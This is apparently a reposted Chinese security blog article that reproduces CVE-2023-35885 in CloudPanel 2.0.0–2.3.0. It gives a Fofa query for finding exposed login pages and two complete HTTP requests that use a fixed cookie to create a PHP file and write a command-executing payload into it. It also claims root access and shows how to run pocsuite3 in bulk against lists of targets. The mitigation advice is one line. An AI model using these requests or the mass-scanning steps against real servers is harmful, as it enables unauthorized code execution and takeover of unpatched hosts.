<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NpBPoV98HzyLfEFwwNhP2Q)

**免责声明：**该公众号大部分文章来自作者日常学习，也有部分文章是经过作者授权和其他公众号白名单转载，如需转载，请联系公众号。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

0x01 前言

CloudPanel 是一个基于 Web 的控制面板或管理界面，旨在简化云托管环境的管理。它提供了一个集中式平台，用于管理云基础架构的各个方面，包括虚拟机 （VM）、存储、网络和应用程序。CloudPanel 存在任意文件上传漏洞，攻击者可以通过接口创建 PHP 文件来获取服务器权限。

0x02 影响平台

```
CloudPanel >= v2.0.0 && <= v2.3.0

```

‍

0x03 漏洞复现

```
Fofa：title=="CloudPanel | Log In"

```

首页：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/fMIPoqZAkaR80udX8Bn7ibwaMEibM7CVMReVicGuu2OzqxHAlzQInRrRzvAPE2pxtTx5yOoYHibib8c3yTJbrPBsO0Q/640?wx_fmt=png&from=appmsg)

/file-manager/backend/makefile 接口创建文件

```
POST /file-manager/backend/makefile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (compatible; MSIE 5.0; Windows NT 5.1; Trident/3.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM=
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
id=/htdocs/app/files/public/&name=confg.php

```

/file-manager/backend/text 接口写入文件内容  

```
POST /file-manager/backend/text HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (compatible; MSIE 5.0; Windows NT 5.1; Trident/3.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM=
Content-Length: 93
Content-Type: application/x-www-form-urlencoded
id=/htdocs/app/files/public/confg.php&content=<?php system('id');phpinfo();unlink(__FILE__)?>

```

访问创建的文件  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/fMIPoqZAkaR80udX8Bn7ibwaMEibM7CVMRnLa0o3BvUJl0D6icHqUaEQuqxicRojicTyj4ibapnuCmMyvkpL4Lbmia5PQ/640?wx_fmt=png&from=appmsg)

获取 root 权限

![](https://mmbiz.qpic.cn/sz_mmbiz_png/fMIPoqZAkaR80udX8Bn7ibwaMEibM7CVMR0jqkQSKP5bQDrJuiajoKeDrhd7rQIRdZMItWZabfa6P1UUualSBjp8g/640?wx_fmt=png&from=appmsg)

0x04 修复建议  

```
关注厂商更新产品：
https://www.cloudpanel.io/

```

‍‍0x05 参考链接

```
https://nvd.nist.gov/vuln/detail/CVE-2023-35885

```

‍  

关注公众号回复 **CVE-2023-35885** 获取 Pocsuite 框架 POC

使用方法：pocsuite -r CVE-2023-35885.py -u [url]

```
pocsuite3安装(python3环境)
pip3 install pocsuite3
设置代理
pocsuite -r POC.py -u [url] --proxy http://IP:PORT
批量验证
pocsuite -r POC.py -f [file.txt]

```